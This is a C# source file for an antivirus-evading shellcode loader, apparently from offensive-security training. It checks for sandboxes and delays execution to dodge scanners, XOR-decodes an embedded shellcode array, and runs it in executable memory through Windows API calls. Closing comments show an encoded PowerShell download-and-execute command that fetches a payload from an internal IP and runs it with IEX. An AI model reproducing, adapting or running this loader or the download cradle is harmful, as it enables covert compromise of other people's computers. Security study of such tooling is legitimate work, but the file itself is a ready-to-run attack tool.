using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace payload
{
    public class Program
    {
		[DllImport("kernel32.dll")]
		static extern void Sleep(uint dwMilliseconds);

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		[DllImport("kernel32.dll")]
		private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

		[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

		[System.Runtime.InteropServices.DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();

		[DllImport("kernel32.dll", SetLastError = false)]
		static extern IntPtr FlsAlloc(IntPtr callback);
		public static void Main(string[] args)
        {
			IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
			if (mem == null)
			{
				return;
			}

			IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
			if (ptrCheck == null)
			{
				return;
			}
			//sleep evade in-memory scan, check fast forward in case exit and run
			var rand = new Random();
			uint check = (uint)rand.Next(10000, 20000);
			double stuff = check / 1000 - 0.5;
			DateTime before = DateTime.Now;
			Sleep(check);
			if (DateTime.Now.Subtract(before).TotalSeconds < stuff)
			{
				return;
			}


			// 			XOR payload(key: 0xfa):

			byte[] buf = new byte[718] {
0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
0xb2, 0xcb, 0x28, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2, 0xb2, 0x71, 0xa8,
0xda, 0xab, 0xac, 0xb2, 0x71, 0x88, 0xaa, 0xb7, 0xcb, 0x33, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0,
0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb,
0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xb2, 0x71, 0xa8, 0xda, 0x71, 0xb8, 0xc6, 0xb2, 0xfb, 0x2a,
0xbb, 0xab, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71,
0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0x71, 0xb2,
0xe2, 0xbe, 0x71, 0xba, 0xda, 0xaa, 0xb3, 0xfb, 0x2a, 0x19, 0xac, 0xb7, 0xcb, 0x33, 0xb2,
0x05, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0x56, 0xbb, 0x3b,
0x33, 0xf7, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf,
0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71,
0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2,
0xb2, 0xfb, 0x2a, 0xbb, 0xa2, 0xa4, 0xa3, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2,
0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13,
0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb2, 0xcb, 0x21, 0xa9, 0xb3, 0x44, 0x8d, 0x93, 0x94, 0x93,
0x94, 0x9f, 0x8e, 0xfa, 0xbb, 0xac, 0xb2, 0x73, 0x1b, 0xb3, 0x3d, 0x38, 0xb6, 0x8d, 0xdc,
0xfd, 0x05, 0x2f, 0xa9, 0xa9, 0xb2, 0x73, 0x1b, 0xa9, 0xa0, 0xb7, 0xcb, 0x3a, 0xb7, 0xcb,
0x33, 0xa9, 0xa9, 0xb3, 0x40, 0xc0, 0xac, 0x83, 0x5d, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f,
0x12, 0xf5, 0xfa, 0xfa, 0xfa, 0xcb, 0xc3, 0xc8, 0xd4, 0xcb, 0xcc, 0xc2, 0xd4, 0xce, 0xcf,
0xd4, 0xcb, 0xc2, 0xcd, 0xfa, 0xa0, 0xb2, 0x73, 0x3b, 0xb3, 0x3d, 0x3a, 0x41, 0xfb, 0xfa,
0xfa, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0x90, 0xf9, 0xa9, 0xb3, 0x40, 0xad, 0x73, 0x65, 0x3c,
0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0x12, 0x3f, 0xfa, 0xfa, 0xfa, 0xd5, 0x9b, 0x95, 0xcf,
0xce, 0x8a, 0xcc, 0x9b, 0x97, 0xa9, 0xd7, 0xce, 0x9f, 0xbc, 0x82, 0xc2, 0xac, 0x9f, 0xbb,
0x89, 0x90, 0xce, 0x8d, 0x88, 0x8d, 0x90, 0x9c, 0xad, 0xcf, 0xbf, 0xad, 0xa2, 0x8e, 0xd7,
0xce, 0x83, 0x9e, 0x91, 0x9d, 0x9e, 0x99, 0xcf, 0x8f, 0xcd, 0xd7, 0xab, 0x94, 0xb3, 0x99,
0x82, 0xc9, 0xab, 0xcd, 0x99, 0xaf, 0xb6, 0x97, 0x8e, 0x9b, 0xb5, 0x88, 0xc2, 0xc3, 0x8e,
0x80, 0x9b, 0x9c, 0x88, 0x8b, 0xb6, 0x97, 0x95, 0xab, 0xab, 0x89, 0xa8, 0xbb, 0x82, 0xa0,
0xa8, 0xcb, 0xbb, 0xb2, 0xbf, 0x91, 0xce, 0x88, 0xb8, 0xbf, 0x8d, 0xb0, 0xae, 0xbe, 0x9b,
0xa8, 0xbc, 0x88, 0xca, 0xca, 0xac, 0x8c, 0xd7, 0x89, 0xac, 0xb9, 0xce, 0xbb, 0xb4, 0x97,
0xae, 0xa3, 0x9d, 0x8e, 0x97, 0xa5, 0xbb, 0x92, 0xb5, 0xcb, 0xc8, 0xac, 0x8d, 0x92, 0x8e,
0xac, 0xae, 0xa0, 0xb7, 0xb0, 0x97, 0xc2, 0x97, 0xbc, 0x94, 0x9d, 0xbf, 0x8f, 0xa5, 0xae,
0xa3, 0x97, 0x9f, 0x96, 0xcc, 0xbd, 0xb8, 0xa2, 0xb7, 0x95, 0x96, 0xb0, 0x9e, 0xca, 0x9b,
0x9d, 0xbd, 0xb3, 0xa2, 0xb8, 0xbe, 0x8d, 0xa2, 0x8b, 0x92, 0x9e, 0xbc, 0xae, 0xb4, 0xc2,
0xae, 0xb5, 0xa0, 0xae, 0xcf, 0x8d, 0x98, 0x92, 0x8a, 0xb5, 0x88, 0xcd, 0xa2, 0xaa, 0xbf,
0x91, 0x8f, 0x89, 0x95, 0x91, 0xb3, 0xac, 0xae, 0xb5, 0xcb, 0xce, 0x9f, 0xfa, 0xb2, 0x73,
0x3b, 0xa9, 0xa0, 0xbb, 0xa2, 0xb7, 0xcb, 0x33, 0xa9, 0xb2, 0x42, 0xfa, 0xf8, 0xd2, 0x7e,
0xfa, 0xfa, 0xfa, 0xfa, 0xaa, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0x11, 0xaf, 0xd4, 0xc1, 0x05,
0x2f, 0xb2, 0x73, 0x3c, 0x90, 0xf0, 0xa5, 0xa9, 0xa0, 0xb2, 0x73, 0x0b, 0xb7, 0xcb, 0x33,
0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0xd7, 0xfc, 0xe2, 0x81, 0x05, 0x2f, 0x7f,
0x3a, 0x8f, 0xe5, 0xb2, 0x3d, 0x3b, 0x72, 0xe9, 0xfa, 0xfa, 0xb3, 0x40, 0xbe, 0x0a, 0xcf,
0x1a, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x05, 0x35, 0x8e, 0xf8, 0x11, 0x36, 0x12,
0xaf, 0xfa, 0xfa, 0xfa, 0xa9, 0xa3, 0x90, 0xba, 0xa0, 0xb3, 0x73, 0x2b, 0x3b, 0x18, 0xea,
0xb3, 0x3d, 0x3a, 0xfa, 0xea, 0xfa, 0xfa, 0xb3, 0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0xfa, 0xfa,
0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x69, 0xa9, 0xa9, 0xb2, 0x73, 0x1d, 0xb2, 0x73, 0x0b, 0xb2,
0x73, 0x20, 0xb3, 0x3d, 0x3a, 0xfa, 0xda, 0xfa, 0xfa, 0xb3, 0x73, 0x03, 0xb3, 0x40, 0xe8,
0x6c, 0x73, 0x18, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x79, 0x3e, 0xda, 0x7f, 0x3a,
0x8e, 0x48, 0x9c, 0x71, 0xfd, 0xb2, 0xfb, 0x39, 0x7f, 0x3a, 0x8f, 0x28, 0xa2, 0x39, 0xa2,
0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05, 0x2f
};





			int size = buf.Length;
			IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
			for (int i = 0; i < buf.Length; i++)
			{
				buf[i] = (byte)((uint)buf[i] ^ 0xfa);
			}
			Marshal.Copy(buf, 0, addr, size);

			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
			//We'll once again use the WaitForSingleObject API to let the shellcode finish execution. Otherwise, the Jscript execution would terminate the process before the shell becomes active.
			WaitForSingleObject(hThread, 0xFFFFFFFF);
		}
    }
}


//PS C:\Windows\system32> $command = '(New-Object System.Net.WebClient).DownloadString("http://172.16.125.133/payload86.txt") | IEX'
//PS C:\Windows\system32 >  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
//PS C:\Windows\system32 > $encodedCommand = [Convert]::ToBase64String($bytes)
//PS C:\Windows\system32 > $encodedCommand
//KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgAxADIANQAuADEAMwAzAC8AcABhAHkAbABvAGEAZAA4ADYALgB0AHgAdAAiACkAIAB8ACAASQBFAFgA
//PS C:\Windows\system32 > $encodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command)) | Clip
//PS C:\Windows\system32 >
//PS C:\Windows\system32 > [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command)) | Clip
//PS C:\Windows\system32 > KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgAxADIANQAuADEAMwAzAC8AcABhAHkAbABvAGEAZAA4ADYALgB0AHgAdAAiACkAIAB8ACAASQBFAFgA



//powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgAxADIANQAuADEAMwAzAC8AcABhAHkAbABvAGEAZAA4ADYALgB0AHgAdAAiACkAIAB8ACAASQBFAFgA